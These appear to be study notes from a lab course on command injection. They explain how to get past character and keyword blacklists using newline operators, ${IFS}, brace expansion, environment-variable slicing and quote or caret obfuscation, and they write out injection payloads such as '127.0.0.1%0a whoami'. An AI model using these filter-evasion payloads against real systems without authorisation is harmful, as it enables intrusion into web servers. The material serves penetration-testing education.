## Bypassing Space Filters

### Bypass Blacklisted Operators

The new-line character is usually not blacklisted, is it may be needed in the payload. Let try to use it as our injection operator:
![[cmdinj_filters_operator.jpg]]

We got the response, so we know the encode new-line character isn't blacklisted.

### Bypass Blacklisted Spaces

Now that we have a working injection operator, let us modify our original payload and send it again as (`127.0.0.1%0a whoami`):
![[cmdinj_filters_spaces_1.jpg]]

We will get the error message if we will only add the space character. The space character is often blacklisted, but there are many ways to add a space character without actually using a space character.

#### Using Tabs

Using tabs (%09) instead of spaces is a technique that may work, as both Linux and Windows accept commands with tabs between arguments, and they are executed the same.

#### Using $IFS

Using the ($IFS) Linux Environment Variable may also work since its default value is a space and a tab, which would work between command arguments. So we could use ${IFS} in place of the space.
(`127.0.0.1%0a${IFS}`)

#### Using Brace Expansion

There are many other methods we can utilize to bypass space filters. For example, we can use the `Bash Brace Expansion` feature, which automatically adds spaces between arguments wrapped between braces, as follows:
```shell-session
$ {ls,-la}

total 0
drwxr-xr-x 1 21y4d 21y4d   0 Jul 13 07:37 .
drwxr-xr-x 1 21y4d 21y4d   0 Jul 13 13:01 ..
```

We can use it in our example as well (`127.0.0.1%0a{ls,-la}`). To discover more space filter bypasses, check out the [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space) page on writing commands without spaces.

## Bypassing Other Blacklisted Characters

A very commonly blacklisted character is the slash (`/`) or backslash (`\`) character, as it is necessary to specify directories in Linux or Windows. We can utilize several techniques to produce any character we want while avoiding the use of blacklisted characters.

### Linux

We can replace slashes (`or any other character`) through `Linux Environment Variables` like we did with `${IFS}`. There's no default environment variable for slashes or semi-colons, however, we can specify start and length of any environment variable.

For example, let's look at the `$PATH` environment variable:
```shell-session
$ echo ${PATH}

/usr/local/bin:/usr/bin:/bin:/usr/games
```

So we can start at the `0` character, and only take a string of length 1:
```shell-session
$ echo ${PATH:0:1}

/
```

**Note:** When we use the above command in our payload, we will not add `echo`, as we are only using it in this case to show the outputted character.

We can do the same with the `$HOME` or `$PWD` environment variables as well. We can also use the same concept to get a semi-colon character, to be used as an injection operator:
```shell-session
$ echo ${LS_COLORS:10:1}

;
```

So, let's try to use environment variables to add a semi-colon and a space to our payload (`127.0.0.1${LS_COLORS:10:1}${IFS}`) as our payload, and see if we can bypass the filter:
![[cmdinj_filters_spaces_5.jpg]]

As we can see, we successfully bypassed the character filter this time as well.

### Windows

The same concept work on Windows as well. For example, to produce a slash in `Windows Command Line (CMD)`, we can `echo` a Windows variable (`%HOMEPATH%` -> `\Users\htb-student`), and then specify a starting position (`~6` -> `\htb-student`), and finally specifying a negative end position, which in this case is the length of the username `htb-student` (`-11` -> `\`) :
```cmd-session
C:\htb> echo %HOMEPATH:~6,-11%

\
```

We can achieve the same thing using the same variables in `Windows PowerShell`. With PowerShell, a word is considered an array, so we have to specify the index of the character we need. As we only need one character, we don't have to specify the start and end positions:
```powershell-session
PS C:\htb> $env:HOMEPATH[0]

\


PS C:\htb> $env:PROGRAMFILES[10]
PS C:\htb>
```

We can also use the `Get-ChildItem Env:` PowerShell command to print all environment variables and then pick one of them to produce a character we need.

### Character Shifting

The following Linux command shifts the character we pass by 1. We should find the character in the ASCII table that is just before our needed character (we can get it with `man ascii`). then add it instead of `[` in the below example. This way, the last printed character would be the one we need:
```shell-session
$ man ascii     # \ is on 92, before it is [ on 91
Wildland4958@htb[/htb]$ echo $(tr '!-}' '"-~'<<<[)

\
```

We can use PowerShell commands to achieve the same result in Windows, though they can be quite longer than the Linux ones.

## Bypassing Blacklisted commands

A command blacklist usually consists of a set of words, and if we can obfuscate our commands and make them look different, we may be able to bypass the filters.

### Commands Blacklist

Even though we only use allowed characters the `whoami` command gets blocked:
![[cmdinj_filters_commands_1.jpg]]

A basic command blacklist filter in `PHP` would look like the following:
```php
$blacklist = ['whoami', 'cat', ...SNIP...];
foreach ($blacklist as $word) {
    if (strpos('$_POST['ip']', $word) !== false) {
        echo "Invalid input";
    }
}
```

We can utilize various obfuscation techniques that will execute our command without using the exact command word.

### Linux & Windows

There are certain characters that are usually ignored by command shells like `Bash` or `PowerShell`, so we can try to add those characters within our blacklisted command. Some of these characters are a single-quote `'` and a double-quote `"`, in addition to a few others.

The easiest to use are quotes, and they work on both Linux and Windows servers. For example, if we want to obfuscate the `whoami` command, we can insert single quotes between its characters, as follows:
```shell-session
$ w'h'o'am'i

21y4d
```

The same works with double-quotes as well:
```shell-session
21y4d@htb[/htb]$ w"h"o"am"i

21y4d
```

The important things to remember are that `we cannot mix types of quotes` and `the number of quotes must be even`. We can try one of the above in our payload (`127.0.0.1%0aw'h'o'am'i`) and see if it works.

### Linux Only

Characters only the `bash` shell would ignore include `\` and the potential parameter character `$@`. In this case, `the number of characters do not have to be even`, and we can insert just one of them if we want to:
```bash
who$@ami
w\ho\am\i
```

### Windows Only

There are also some Windows-only characters we can insert in the middle of commands that do not affect the outcome, like a caret (`^`) character, as we can see in the following example:
```cmd-session
C:\htb> who^ami

21y4d
```
